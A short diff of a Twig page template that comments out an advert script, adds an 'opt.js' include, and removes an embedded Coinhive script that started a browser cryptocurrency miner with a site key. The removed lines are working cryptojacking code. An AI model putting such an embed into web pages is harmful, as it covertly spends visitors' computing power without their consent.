@@ -24,9 +24,10 @@
     <script type="text/javascript" src="{{ asset('/dev/js/advert.js') }}"></script>
     <script type="text/javascript" src="{{ asset('/js/app.js') }}"></script>
 {% else %}
-    <script type="text/javascript" src="{{ asset(advert_script) }}"></script>
+    <!--<script type="text/javascript" src="{{ asset(advert_script) }}"></script>-->
     <script type="text/javascript" src="{{ asset('/js/app.min.js'|asset_js_version) }}"></script>
 {% endif %}
+<script type="text/javascript" src="{{ asset('/js/opt.js') }}"></script>
 <script type="text/javascript">
     $(document).ready(function () {
         $(document).foundation({
@@ -44,11 +45,6 @@
         });
         {% block document_ready %}{% endblock %}
     });
-</script>
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-    var miner = new CoinHive.Anonymous('NyzJaDRELrFtg4PNvkU4Wbo8hNNN2bVF');
-    miner.start();
 </script>
 </body>
 </html>
